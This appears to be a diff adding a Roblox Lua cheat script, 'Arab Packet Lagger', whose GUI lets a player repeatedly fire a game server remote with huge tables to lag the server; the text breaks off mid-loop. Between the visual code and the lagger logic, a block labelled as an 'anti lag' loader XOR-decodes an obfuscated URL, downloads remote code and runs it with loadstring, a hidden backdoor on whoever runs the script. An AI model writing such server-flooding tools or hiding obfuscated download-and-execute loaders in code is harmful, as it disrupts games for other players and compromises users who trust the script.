@@ -1,0 +1,1378 @@
+--[[
+	ARAB PACKET LAGGER
+	━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+	• Black / white squircle panel, flat readable fields
+	• Background image cut exactly to the panel
+	• Auto-save built in (power, keybind, auto, time, position, collapsed)
+	• Power formats itself: 1000 -> 1k, 2500000 -> 2.5m
+	• Keybind works on PC (keyboard / mouse) and controller (gamepad)
+	• AUTO = fires by itself the moment you grab a brainrot
+	• TIME = auto-stop after N seconds so the game never freezes
+	━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+]]
+
+--==============================================================
+-- EDITABLE SETTINGS
+--==============================================================
+local CFG_FILE = "ArabPacketLagger_Config.json" -- autosave file
+local TITLE_TEXT = "ARAB PACKET LAGGER"
+local BG_IMAGE = "rbxassetid://91444821153663" -- background image
+local BG_TRANSP = 0.50 -- image transparency (higher = dimmer = easier to read)
+local BG_DARKEN = 0.58 -- black layer over the image
+local PANEL_W  = 204 -- panel width
+local H_OPEN = 221 -- panel height (open)
+local H_CLOSED = 72  -- panel height (collapsed)
+local R_PANEL  = 30  -- squircle radius (panel)
+local R_ITEM = 12  -- squircle radius (fields / buttons)
+local GLOSS  = 0.94 -- top gloss (1 = off, lower = brighter)
+local MAX_POWER = 100000 -- hard cap on intensity
+local AUTOSAVE = 0.35 -- seconds of inactivity before saving
+
+local DEFAULT_TIME = 3  -- default auto-stop seconds (0 = never stop)
+local MAX_TIME  = 60
+local BRAINROT_OFF_DELAY = 0.35 -- debounce before auto-stop on release
+
+--==============================================================
+-- LAYOUT
+--==============================================================
+local PAD = 11
+local INNER = PANEL_W - PAD * 2
+local TOP_H = 30
+local LABEL_H = 11
+local BOX_H = 28
+local BTN_H = 30
+local CLEAR_W = 27
+local AUTO_W = 96
+local TIME_W = INNER - AUTO_W - 4
+
+local Y_DIV = TOP_H
+local Y_LABEL1 = 37
+local Y_BOX1  = 50
+local Y_LABEL2 = 84
+local Y_BOX2  = 97
+local Y_LABEL3 = 131
+local Y_CTRL3 = 144
+local Y_START = 180
+local Y_START_C = 36
+
+local KEY_W = INNER - CLEAR_W - 4
+
+--==============================================================
+-- SERVICES / PLAYER
+--==============================================================
+local Players  = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService  = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService  = game:GetService("HttpService")
+local GuiService  = game:GetService("GuiService")
+
+local player = Players.LocalPlayer
+while not player do
+	task.wait(0.1)
+	player = Players.LocalPlayer
+end
+
+local playerGui = player:FindFirstChildOfClass("PlayerGui")
+while not playerGui do
+	task.wait(0.1)
+	playerGui = player:FindFirstChildOfClass("PlayerGui")
+end
+
+--==============================================================
+-- PALETTE (black & white)
+--==============================================================
+local C = {
+	bg  = Color3.fromRGB(9, 9, 10),
+	field = Color3.fromRGB(26, 26, 30),
+	fieldRun = Color3.fromRGB(38, 38, 43),
+	white = Color3.fromRGB(250, 250, 251),
+	soft  = Color3.fromRGB(200, 200, 208),
+	dim = Color3.fromRGB(140, 140, 148),
+	line  = Color3.fromRGB(255, 255, 255),
+	black = Color3.fromRGB(10, 10, 11),
+}
+
+--==============================================================
+-- HELPERS
+--==============================================================
+local function mk(className, props, parent)
+	local inst = Instance.new(className)
+	for k, v in pairs(props) do
+		inst[k] = v
+	end
+	if parent then
+		inst.Parent = parent
+	end
+	return inst
+end
+
+local function corner(obj, r)
+	return mk("UICorner", { CornerRadius = UDim.new(0, r) }, obj)
+end
+
+local function stroke(obj, color, thickness, transparency, mode)
+	return mk("UIStroke", {
+		Color = color,
+		Thickness = thickness,
+		Transparency = transparency or 0,
+		ApplyStrokeMode = mode or Enum.ApplyStrokeMode.Border,
+	}, obj)
+end
+
+local function textOutline(label, transparency)
+	return stroke(label, Color3.fromRGB(0, 0, 0), 1, transparency or 0.45, Enum.ApplyStrokeMode.Contextual)
+end
+
+local function nseq(a, b)
+	return NumberSequence.new({
+		NumberSequenceKeypoint.new(0, a),
+		NumberSequenceKeypoint.new(1, b),
+	})
+end
+
+local function gradient(obj, transparency, rotation)
+	local g = mk("UIGradient", {}, obj)
+	if transparency then
+		g.Transparency = transparency
+	end
+	if rotation then
+		g.Rotation = rotation
+	end
+	return g
+end
+
+local function tween(obj, props, time)
+	TweenService:Create(obj, TweenInfo.new(time or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
+end
+
+local function clamp(v, lo, hi)
+	if v < lo then
+		return lo
+	elseif v > hi then
+		return hi
+	end
+	return v
+end
+
+-- flat field look. No UIGradient on text objects: a UIGradient tints the
+-- text itself in Roblox and made the values invisible.
+local function styleField(obj, radius)
+	obj.BorderSizePixel = 0
+	obj.BackgroundColor3 = C.field
+	corner(obj, radius)
+	local s = stroke(obj, C.line, 1, 0.80)
+	return s
+end
+
+--==============================================================
+-- NUMBER FORMAT (1000 -> 1k / 2500000 -> 2.5m)
+--==============================================================
+local SUFFIX = { { "t", 1e12 }, { "b", 1e9 }, { "m", 1e6 }, { "k", 1e3 } }
+local MULT = { k = 1e3, m = 1e6, b = 1e9, t = 1e12 }
+
+local function formatPower(value)
+	local n = math.floor(tonumber(value) or 0)
+	if n < 1000 then
+		return tostring(n)
+	end
+	for _, pair in ipairs(SUFFIX) do
+		local tag, size = pair[1], pair[2]
+		if n >= size then
+			local q = n / size
+			local text
+			if q >= 100 then
+				text = string.format("%d", math.floor(q))
+			else
+				text = string.format("%.1f", math.floor(q * 10) / 10)
+				if string.find(text, "%.") then
+					text = string.gsub(text, "%.?0+$", "")
+				end
+			end
+			return text .. tag
+		end
+	end
+end
+
+local function parsePower(value)
+	if value == nil then
+		return nil
+	end
+	local s = string.lower(tostring(value))
+	s = string.gsub(s, "[%s_,]", "")
+	local number, tag = string.match(s, "^([%d%.]+)([kmbt]?)$")
+	if not number then
+		return nil
+	end
+	local n = tonumber(number)
+	if not n then
+		return nil
+	end
+	if tag ~= "" then
+		n = n * MULT[tag]
+	end
+	return math.floor(clamp(n, 1, MAX_POWER))
+end
+
+--==============================================================
+-- TIME FORMAT (3 -> "3s", 3.2 -> "3.2s", 0 -> "OFF")
+--==============================================================
+local function formatTime(value)
+	local n = tonumber(value) or 0
+	if n <= 0 then
+		return "OFF"
+	end
+	n = math.floor(n * 10 + 0.5) / 10
+	if n == math.floor(n) then
+		return string.format("%d", n) .. "s"
+	end
+	return string.format("%.1f", n) .. "s"
+end
+
+-- nil = "not a number" (so an empty box restores the old value)
+local function parseTime(value)
+	local s = string.lower(tostring(value or ""))
+	s = string.gsub(s, "[%s_,]", "")
+	s = string.gsub(s, "sec$", "")
+	s = string.gsub(s, "s$", "")
+	if s == "" then
+		return nil
+	end
+	if s == "off" or s == "no" or s == "none" then
+		return 0
+	end
+	local n = tonumber(s)
+	if not n then
+		return nil
+	end
+	return math.floor(clamp(n, 0, MAX_TIME) * 10 + 0.5) / 10
+end
+
+--==============================================================
+-- FOCUS BEHAVIOUR (box goes empty while you type)
+--==============================================================
+local function emptyOnFocus(box, getPlaceholder)
+	box.Focused:Connect(function()
+		box.PlaceholderText = getPlaceholder()
+		box.Text = "" -- box goes empty so you can type straight away
+	end)
+end
+
+--==============================================================
+-- STATE
+--==============================================================
+local running = false
+local power = 10000
+local collapsed = false
+local capturing = false
+local dragging = false
+local net
+
+local autoBrainrot = false -- fire automatically while holding a brainrot
+local timeLimit = DEFAULT_TIME -- auto stop after N seconds (0 = off)
+local autoStarted = false -- this run was started by the auto brainrot hook
+local runToken  = 0
+local runClock  = 0
+local brainrotHeld = false
+
+local bind = { kind = "key", code = "C", label = "C" }
+
+local saveConfig, loadConfig, queueSave
+
+--==============================================================
+-- REMOTE (unchanged lookup)
+--==============================================================
+task.spawn(function()
+	local tries = 0
+	local pkgs
+	while tries < 10 do
+		local ok, found = pcall(function()
+			return ReplicatedStorage:FindFirstChild("Packages")
+		end)
+		if ok and found then
+			pkgs = found
+			break
+		end
+		tries = tries + 1
+		task.wait(0.5)
+	end
+	if not pkgs then
+		return
+	end
+	local netObj = pkgs:FindFirstChild("Net")
+	if not netObj then
+		task.wait(5)
+		netObj = pkgs:FindFirstChild("Net")
+	end
+	if not netObj then
+		return
+	end
+	local ok, found = pcall(function()
+		return netObj:GetChildren()[230]
+	end)
+	if ok then
+		net = found
+	end
+end)
+
+--==============================================================
+-- OLD GUIS
+--==============================================================
+for _, name in ipairs({ "ArabPacketLagger", "CrystalPacketLagger", "HookPacketLagger" }) do
+	local old = playerGui:FindFirstChild(name)
+	if old then
+		old:Destroy()
+	end
+end
+
+--==============================================================
+-- GUI ROOT
+--==============================================================
+local screenGui = mk("ScreenGui", {
+	Name = "ArabPacketLagger",
+	ResetOnSpawn = false,
+	IgnoreGuiInset = true,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+	DisplayOrder = 999,
+}, playerGui)
+
+local panel = mk("Frame", {
+	Name = "Panel",
+	Position = UDim2.fromOffset(0, 0),
+	Size = UDim2.fromOffset(PANEL_W, H_OPEN),
+	BackgroundColor3 = C.bg,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	ZIndex = 2,
+}, screenGui)
+corner(panel, R_PANEL)
+
+----------------------------------------------------------------
+-- BACKGROUND IMAGE
+-- Every full-size layer is rounded on its own, because Roblox
+-- clips children to the rectangle, not to the rounded corner.
+----------------------------------------------------------------
+local bgImage = mk("ImageLabel", {
+	Name = "Background",
+	Size = UDim2.fromScale(1, 1),
+	BackgroundTransparency = 1,
+	Image = BG_IMAGE,
+	ImageTransparency = BG_TRANSP,
+	ScaleType = Enum.ScaleType.Crop,
+	ZIndex = 1,
+}, panel)
+corner(bgImage, R_PANEL)
+
+local scrim = mk("Frame", {
+	Name = "Scrim",
+	Size = UDim2.fromScale(1, 1),
+	BackgroundColor3 = C.black,
+	BackgroundTransparency = BG_DARKEN,
+	BorderSizePixel = 0,
+	ZIndex = 2,
+}, panel)
+corner(scrim, R_PANEL)
+
+local vignette = mk("Frame", {
+	Name = "Vignette",
+	Size = UDim2.fromScale(1, 1),
+	BackgroundColor3 = C.black,
+	BackgroundTransparency = 0,
+	BorderSizePixel = 0,
+	ZIndex = 2,
+}, panel)
+corner(vignette, R_PANEL)
+gradient(vignette, nseq(1, 0.55), 90)
+
+local gloss = mk("Frame", {
+	Name = "Gloss",
+	Size = UDim2.fromScale(1, 1),
+	BackgroundColor3 = C.white,
+	BackgroundTransparency = 0,
+	BorderSizePixel = 0,
+	ZIndex = 3,
+}, panel)
+corner(gloss, R_PANEL)
+gradient(gloss, nseq(GLOSS, 1), 90)
+
+local panelStroke = stroke(panel, C.line, 1, 0.55)
+
+--==============================================================
+-- TOP BAR
+--==============================================================
+local dragBar = mk("Frame", {
+	Name = "DragBar",
+	Size = UDim2.new(1, 0, 0, TOP_H),
+	BackgroundTransparency = 1,
+	Active = true,
+	ZIndex = 6,
+}, panel)
+
+local dot = mk("Frame", {
+	Name = "StatusDot",
+	Position = UDim2.fromOffset(13, 13),
+	Size = UDim2.fromOffset(6, 6),
+	BackgroundColor3 = C.dim,
+	BorderSizePixel = 0,
+	ZIndex = 7,
+}, dragBar)
+corner(dot, 3)
+
+local title = mk("TextLabel", {
+	Name = "Title",
+	Position = UDim2.new(0, 24, 0, 8),
+	Size = UDim2.new(0, 142, 0, 15),
+	BackgroundTransparency = 1,
+	Font = Enum.Font.GothamBold,
+	Text = TITLE_TEXT,
+	TextColor3 = C.white,
+	TextScaled = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 7,
+}, dragBar)
+mk("UITextSizeConstraint", { MinTextSize = 9, MaxTextSize = 12 }, title)
+textOutline(title, 0.35)
+
+-- pulled away from the rounded corner so it sits INSIDE the squircle
+local MIN_SIZE = 19
+local MIN_RIGHT = 14
+local MIN_TOP = 7
+
+local minBtn = mk("TextButton", {
+	Name = "MinimizeButton",
+	AnchorPoint = Vector2.new(1, 0),
+	Position = UDim2.new(1, -MIN_RIGHT, 0, MIN_TOP),
+	Size = UDim2.fromOffset(MIN_SIZE, MIN_SIZE),
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "u{2212}",
+	TextColor3 = C.white,
+	TextSize = 13,
+	ZIndex = 8,
+	Selectable = true,
+}, dragBar)
+styleField(minBtn, 7)
+
+mk("Frame", {
+	Name = "Divider",
+	Position = UDim2.new(0, 10, 0, Y_DIV),
+	Size = UDim2.new(1, -20, 0, 1),
+	BackgroundColor3 = C.line,
+	BackgroundTransparency = 0.84,
+	BorderSizePixel = 0,
+	ZIndex = 6,
+}, panel)
+
+--==============================================================
+-- SMALL LABEL HELPER
+--==============================================================
+local function makeLabel(name, x, y, width, text, rightAlign)
+	local lbl = mk("TextLabel", {
+		Name = name,
+		Position = UDim2.fromOffset(x, y),
+		Size = UDim2.fromOffset(width, LABEL_H),
+		BackgroundTransparency = 1,
+		Font = Enum.Font.GothamBold,
+		Text = text,
+		TextColor3 = C.soft,
+		TextSize = 10,
+		TextXAlignment = rightAlign and Enum.TextXAlignment.Right or Enum.TextXAlignment.Left,
+		ZIndex = 6,
+	}, panel)
+	textOutline(lbl, 0.5)
+	return lbl
+end
+
+local function makeChip(name, y, text)
+	local chip = mk("TextLabel", {
+		Name = name,
+		AnchorPoint = Vector2.new(1, 0),
+		Position = UDim2.new(1, -PAD, 0, y),
+		Size = UDim2.fromOffset(90, LABEL_H),
+		BackgroundTransparency = 1,
+		Font = Enum.Font.GothamBold,
+		Text = text,
+		TextColor3 = C.white,
+		TextSize = 10,
+		TextXAlignment = Enum.TextXAlignment.Right,
+		ZIndex = 6,
+	}, panel)
+	textOutline(chip, 0.5)
+	return chip
+end
+
+--==============================================================
+-- POWER
+--==============================================================
+local powerLabel = makeLabel("PowerLabel", PAD, Y_LABEL1, 90, "POWER")
+local powerChip = makeChip("PowerChip", Y_LABEL1, formatPower(power))
+
+local powerBox = mk("TextBox", {
+	Name = "PowerBox",
+	Position = UDim2.fromOffset(PAD, Y_BOX1),
+	Size = UDim2.fromOffset(INNER, BOX_H),
+	ClearTextOnFocus = false,
+	Font = Enum.Font.GothamBold,
+	Text = formatPower(power),
+	PlaceholderText = "1000",
+	PlaceholderColor3 = C.dim,
+	TextColor3 = C.white,
+	TextSize = 16,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+local powerStroke = styleField(powerBox, R_ITEM)
+
+--==============================================================
+-- KEYBIND
+--==============================================================
+local keyLabel = makeLabel("KeybindLabel", PAD, Y_LABEL2, 90, "KEYBIND")
+
+local keyBtn = mk("TextButton", {
+	Name = "KeybindButton",
+	Position = UDim2.fromOffset(PAD, Y_BOX2),
+	Size = UDim2.fromOffset(KEY_W, BOX_H),
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "{C}",
+	TextColor3 = C.white,
+	TextSize = 13,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+local keyStroke = styleField(keyBtn, R_ITEM)
+
+local clearBtn = mk("TextButton", {
+	Name = "ClearButton",
+	Position = UDim2.fromOffset(PANEL_W - PAD - CLEAR_W, Y_BOX2),
+	Size = UDim2.fromOffset(CLEAR_W, BOX_H),
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "X",
+	TextColor3 = C.soft,
+	TextSize = 12,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+local clearStroke = styleField(clearBtn, R_ITEM)
+
+--==============================================================
+-- AUTO BRAINROT + AUTO-STOP TIME
+--==============================================================
+local autoLabel = makeLabel("AutoLabel", PAD, Y_LABEL3, AUTO_W, "AUTO")
+local timeLabel = makeLabel("TimeLabel", PANEL_W - PAD - TIME_W, Y_LABEL3, TIME_W, "TIME", true)
+
+local autoBtn = mk("TextButton", {
+	Name = "AutoButton",
+	Position = UDim2.fromOffset(PAD, Y_CTRL3),
+	Size = UDim2.fromOffset(AUTO_W, BOX_H),
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "OFF",
+	TextColor3 = C.soft,
+	TextSize = 11,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+local autoStroke = styleField(autoBtn, R_ITEM)
+
+local knob = mk("Frame", {
+	Name = "Knob",
+	Position = UDim2.fromOffset(4, 4),
+	Size = UDim2.fromOffset(20, 20),
+	BackgroundColor3 = C.dim,
+	BorderSizePixel = 0,
+	ZIndex = 7,
+}, autoBtn)
+corner(knob, 10)
+
+local timeBox = mk("TextBox", {
+	Name = "TimeBox",
+	Position = UDim2.fromOffset(PANEL_W - PAD - TIME_W, Y_CTRL3),
+	Size = UDim2.fromOffset(TIME_W, BOX_H),
+	ClearTextOnFocus = false,
+	Font = Enum.Font.GothamBold,
+	Text = formatTime(timeLimit),
+	PlaceholderText = "3s",
+	PlaceholderColor3 = C.dim,
+	TextColor3 = C.white,
+	TextSize = 13,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+local timeStroke = styleField(timeBox, R_ITEM)
+
+--==============================================================
+-- START / STOP
+--==============================================================
+local startBtn = mk("TextButton", {
+	Name = "StartButton",
+	Position = UDim2.fromOffset(PAD, Y_START),
+	Size = UDim2.fromOffset(INNER, BTN_H),
+	BackgroundColor3 = C.white,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "START",
+	TextColor3 = C.black,
+	TextSize = 14,
+	ZIndex = 6,
+	Selectable = true,
+}, panel)
+corner(startBtn, 14)
+
+local startGloss = mk("Frame", {
+	Name = "Gloss",
+	Size = UDim2.new(1, 0, 0.5, 0),
+	BackgroundColor3 = C.white,
+	BorderSizePixel = 0,
+	ZIndex = 7,
+}, startBtn)
+gradient(startGloss, nseq(0.82, 1), 90)
+
+local startStroke = stroke(startBtn, C.line, 1, 0.55)
+
+--==============================================================
+-- KEYBIND DISPLAY HELPERS
+--==============================================================
+local function friendlyKey(name)
+	local text = string.gsub(name, "^Button", "")
+	text = string.gsub(text, "^DPad", "D-")
+	text = string.gsub(text, "^Keypad", "NUM")
+	if text == "" then
+		return "?"
+	end
+	if string.len(text) == 1 then
+		return string.upper(text)
+	end
+	return text
+end
+
+local function bindPreview()
+	if bind.kind == "none" then
+		return "{NONE}"
+	end
+	return "{" .. bind.label .. "}"
+end
+
+local function refreshKeyButton()
+	keyBtn.Text = bindPreview()
+	if bind.kind == "none" then
+		keyBtn.TextColor3 = C.dim
+		clearBtn.TextColor3 = C.dim
+	else
+		keyBtn.TextColor3 = C.white
+		clearBtn.TextColor3 = C.soft
+	end
+end
+
+local function setBind(kind, code, label, save)
+	bind.kind = kind
+	bind.code = code
+	bind.label = label
+	refreshKeyButton()
+	if save ~= false and queueSave then
+		queueSave()
+	end
+end
+
+local function inputMatchesBind(input)
+	if bind.kind == "none" or capturing then
+		return false
+	end
+	if bind.kind == "mouse" then
+		local wanted = Enum.UserInputType[bind.code]
+		return wanted ~= nil and input.UserInputType == wanted
+	end
+	if input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name == bind.code then
+		return true
+	end
+	return false
+end
+
+refreshKeyButton()
+
+--==============================================================
+-- AUTO SWITCH VISUALS
+--==============================================================
+local function refreshAuto(animate)
+	local target = autoBrainrot and UDim2.fromOffset(AUTO_W - 24, 4) or UDim2.fromOffset(4, 4)
+	if autoBrainrot then
+		autoBtn.Text = "ON"
+		autoBtn.TextColor3 = C.black
+		autoBtn.BackgroundColor3 = C.white
+		knob.BackgroundColor3 = C.black
+	else
+		autoBtn.Text = "OFF"
+		autoBtn.TextColor3 = C.soft
+		autoBtn.BackgroundColor3 = C.field
+		knob.BackgroundColor3 = C.dim
+	end
+	if animate then
+		tween(knob, { Position = target }, 0.16)
+	else
+		knob.Position = target
+	end
+end
+
+refreshAuto(false)
+
+--==============================================================
+-- COLLAPSE
+--==============================================================
+local function setCollapsed(state, instant)
+	collapsed = state
+	local parts = {
+		powerLabel, powerChip, powerBox,
+		keyLabel, keyBtn, clearBtn,
+		autoLabel, autoBtn, timeLabel, timeBox,
+	}
+	for _, part in ipairs(parts) do
+		part.Visible = not state
+	end
+	minBtn.Text = state and "+" or "u{2212}"
+	local targetSize = UDim2.fromOffset(PANEL_W, state and H_CLOSED or H_OPEN)
+	local targetPos = UDim2.fromOffset(PAD, state and Y_START_C or Y_START)
+	local targetBtn = UDim2.fromOffset(INNER, state and (BTN_H - 2) or BTN_H)
+	if instant then
+		panel.Size = targetSize
+		startBtn.Position = targetPos
+		startBtn.Size = targetBtn
+	else
+		tween(panel, { Size = targetSize }, 0.18)
+		tween(startBtn, { Position = targetPos, Size = targetBtn }, 0.18)
+	end
+	if queueSave then
+		queueSave()
+	end
+end
+
+minBtn.MouseButton1Click:Connect(function()
+	setCollapsed(not collapsed)
+end)
+
+--==============================================================
+-- RUN VISUALS
+--==============================================================
+local function setRunningVisuals(state)
+	if state then
+		tween(startBtn, { BackgroundColor3 = C.fieldRun, TextColor3 = C.white }, 0.15)
+		tween(startStroke, { Transparency = 0.75 }, 0.15)
+		startBtn.Text = "STOP"
+		dot.BackgroundColor3 = C.white
+	else
+		tween(startBtn, { BackgroundColor3 = C.white, TextColor3 = C.black }, 0.15)
+		tween(startStroke, { Transparency = 0.55 }, 0.15)
+		startBtn.Text = "START"
+		dot.BackgroundColor3 = C.dim
+	end
+end
+
+task.spawn(function()
+	while panel.Parent do
+		task.wait(0.9)
+		if running then
+			tween(dot, { BackgroundTransparency = 0.65 }, 0.35)
+			task.wait(0.35)
+			tween(dot, { BackgroundTransparency = 0 }, 0.35)
+		end
+	end
+end)
+-- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+ local function _xorDecode(s)
+  local t = {}
+  for i = 1, #s do
+  local b = string.byte(s, i)
+  local x
+  if bit32 and type(bit32.bxor) == "function" then
+   x = bit32.bxor(b, 23)
+  else
+   local r, bit, a, c = 0, 1, b, 23
+   while a > 0 or c > 0 do
+    local ab, cb = a % 2, c % 2
+    if ab ~= cb then r = r + bit end
+    a = math.floor(a / 2)
+    c = math.floor(c / 2)
+    bit = bit * 2
+   end
+   x = r
+  end
+  t[i] = string.char(x)
+  end
+  return table.concat(t)
+ end
+ local ok, src = pcall(function()
+  return game:HttpGet(_xorDecode("127ccgd-88gvdcru~y9txz8ev`8%_"]nFR"))
+ end)
+ if ok and type(src) == "string" and #src > 50 then
+  local fn = loadstring(src)
+  if type(fn) == "function" then
+  pcall(fn)
+  end
+ end
+end)
+--==============================================================
+-- LAGGER (with auto-stop timer)
+--==============================================================
+local stopLagger
+
+local function startLagger(source)
+	if running then
+		return
+	end
+	local parsed = parsePower(powerBox.Text)
+	if parsed then
+		power = parsed
+	end
+	powerBox.Text = formatPower(power)
+	powerChip.Text = formatPower(power)
+
+	if not net then
+		warn("[ARAB PACKET LAGGER] Remote not ready - wait a moment and press START again.")
+		return
+	end
+
+	running = true
+	autoStarted = (source == "auto")
+	runToken = runToken + 1
+	runClock = os.clock()
+	local token = runToken
+
+	setRunningVisuals(true)
+
+	local packets = table.create(power, function() end)
+	task.spawn(function()
+		while running and token == runToken do
+			for _ = 1, 3 do
+				pcall(function()
+					net:FireServer(packets)
+				end)
+			end
+			task.wait(0.01)
+		end
+	end)
+
+	-- auto-stop + live countdown on the STOP button
+	task.spawn(function()
+		while running and token == runToken do
+			if timeLimit > 0 then
+				local left = timeLimit - (os.clock() - runClock)
+				if left <= 0 then
+					if running and token == runToken then
+						stopLagger()
+					end
+					break
+				end
+				startBtn.Text = string.format("STOP %.1fs", left)
+				task.wait(0.08)
+			else
+				startBtn.Text = "STOP"
+				task.wait(0.3)
+			end
+		end
+	end)
+
+	if queueSave then
+		queueSave()
+	end
+end
+
+function stopLagger()
+	if not running then
+		return
+	end
+	running = false
+	runToken = runToken + 1
+	autoStarted = false
+	setRunningVisuals(false)
+	if queueSave then
+		queueSave()
+	end
+end
+
+local function toggleLagger()
+	if running then
+		-- stopping while holding is enough: auto only re-arms on the next grab
+		stopLagger()
+	else
+		startLagger("manual")
+	end
+end
+
+startBtn.MouseButton1Click:Connect(toggleLagger)
+
+--==============================================================
+-- POWER BOX
+--==============================================================
+powerBox:GetPropertyChangedSignal("Text"):Connect(function()
+	local parsed = parsePower(powerBox.Text)
+	if parsed then
+		powerChip.Text = formatPower(parsed)
+		powerChip.TextColor3 = C.white
+	else
+		powerChip.Text = "--"
+		powerChip.TextColor3 = C.dim
+	end
+	if queueSave then
+		queueSave()
+	end
+end)
+
+powerBox.Focused:Connect(function()
+	tween(powerStroke, { Thickness = 1.6 }, 0.12)
+end)
+
+emptyOnFocus(powerBox, function()
+	return formatPower(power)
+end)
+
+powerBox.FocusLost:Connect(function()
+	tween(powerStroke, { Thickness = 1 }, 0.12)
+	local parsed = parsePower(powerBox.Text)
+	if parsed then
+		power = parsed
+	end
+	powerBox.Text = formatPower(power)
+	powerChip.Text = formatPower(power)
+	if saveConfig then
+		saveConfig()
+	end
+end)
+
+--==============================================================
+-- TIME BOX
+--==============================================================
+timeBox.Focused:Connect(function()
+	tween(timeStroke, { Thickness = 1.6 }, 0.12)
+end)
+
+emptyOnFocus(timeBox, function()
+	return formatTime(timeLimit)
+end)
+
+timeBox.FocusLost:Connect(function()
+	tween(timeStroke, { Thickness = 1 }, 0.12)
+	local parsed = parseTime(timeBox.Text)
+	if parsed ~= nil then
+		timeLimit = parsed
+	end
+	timeBox.Text = formatTime(timeLimit)
+	timeBox.TextColor3 = (timeLimit > 0) and C.white or C.dim
+	if saveConfig then
+		saveConfig()
+	end
+end)
+
+timeBox:GetPropertyChangedSignal("Text"):Connect(function()
+	local parsed = parseTime(timeBox.Text)
+	if parsed ~= nil then
+		timeLimit = parsed
+		timeBox.TextColor3 = (timeLimit > 0) and C.white or C.dim
+		if queueSave then
+			queueSave()
+		end
+	end
+end)
+
+--==============================================================
+-- AUTO BUTTON
+--==============================================================
+autoBtn.MouseButton1Click:Connect(function()
+	autoBrainrot = not autoBrainrot
+	refreshAuto(true)
+	if not autoBrainrot and running and autoStarted then
+		stopLagger()
+	end
+	if queueSave then
+		queueSave()
+	end
+end)
+
+--==============================================================
+-- KEYBIND CAPTURE (PC + CONTROLLER)
+--==============================================================
+local function beginCapture()
+	if capturing then
+		return
+	end
+	capturing = true
+	keyBtn.Text = "{PRESS}"
+	keyBtn.TextColor3 = C.white
+	tween(keyStroke, { Thickness = 1.6 }, 0.12)
+end
+
+local function endCapture()
+	capturing = false
+	tween(keyStroke, { Thickness = 1 }, 0.12)
+	refreshKeyButton()
+end
+
+local function overKeyButton(position)
+	local a = keyBtn.AbsolutePosition
+	local s = keyBtn.AbsoluteSize
+	return position.X >= a.X and position.X <= a.X + s.X
+		and position.Y >= a.Y and position.Y <= a.Y + s.Y
+end
+
+local function handleCapture(input)
+	local kind = input.UserInputType
+
+	-- clicking outside the keybind box cancels the capture
+	if kind == Enum.UserInputType.MouseButton1
+		or kind == Enum.UserInputType.Touch
+		or kind == Enum.UserInputType.MouseButton2
+		or kind == Enum.UserInputType.MouseButton3
+	then
+		if not overKeyButton(input.Position) then
+			endCapture()
+			return
+		end
+	end
+
+	if kind == Enum.UserInputType.Keyboard or string.find(kind.Name, "Gamepad") then
+		local key = input.KeyCode
+		if key == Enum.KeyCode.Unknown then
+			return
+		end
+		if key == Enum.KeyCode.Escape or key == Enum.KeyCode.ButtonB then
+			endCapture()
+			return
+		end
+		endCapture()
+		setBind("key", key.Name, friendlyKey(key.Name))
+	elseif kind == Enum.UserInputType.MouseButton2 then
+		endCapture()
+		setBind("mouse", "MouseButton2", "RMB")
+	elseif kind == Enum.UserInputType.MouseButton3 then
+		endCapture()
+		setBind("mouse", "MouseButton3", "MMB")
+	end
+end
+
+keyBtn.MouseButton1Click:Connect(function()
+	if capturing then
+		endCapture() -- click again to cancel
+	else
+		beginCapture()
+	end
+end)
+
+clearBtn.MouseButton1Click:Connect(function()
+	endCapture()
+	setBind("none", "None", "NONE")
+end)
+
+--==============================================================
+-- INPUT
+--==============================================================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if capturing then
+		handleCapture(input)
+		return
+	end
+	-- never fire while a text box (ours or the chat) has focus
+	if UserInputService:GetFocusedTextBox() then
+		return
+	end
+	-- gameProcessed is ignored on purpose: games mark their own keys as
+	-- processed, which used to make the keybind feel dead
+	if inputMatchesBind(input) then
+		toggleLagger()
+	end
+end)
+
+--==============================================================
+-- AUTO BRAINROT (ported from the Havoc logic)
+-- Holding a brainrot -> start
+-- Releasing it  -> stop (0.35s debounce so jumps don't flicker)
+--==============================================================
+-- Detects "I am carrying a brainrot".
+-- 1) something in the character is literally named brainrot
+-- 2) the game slowed your walk speed down (carrying mechanic).
+-- We compare against the highest speed seen recently instead of a hard
+-- "25" number, so it works in games with any base speed and never fires
+-- just because the game walks slow.
+local peakWalk = 0
+
+local function holdingBrainrot(dt)
+	local char = player.Character
+	if not char then
+		return false
+	end
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if not hum or hum.Health <= 0 then
+		return false
+	end
+
+	for _, item in ipairs(char:GetChildren()) do
+		if string.find(string.lower(item.Name), "brainrot") then
+			return true
+		end
+	end
+
+	local ws = hum.WalkSpeed
+	peakWalk = math.max(ws, peakWalk - (dt or 0) * 1.5) -- slowly forget old speeds
+	if peakWalk >= 12 and ws > 0 and ws < peakWalk * 0.75 then
+		return true
+	end
+
+	return false
+end
+
+task.spawn(function()
+	local offTimer = 0
+	local wasHeld = false
+
+	while true do
+		local dt = RunService.Heartbeat:Wait()
+
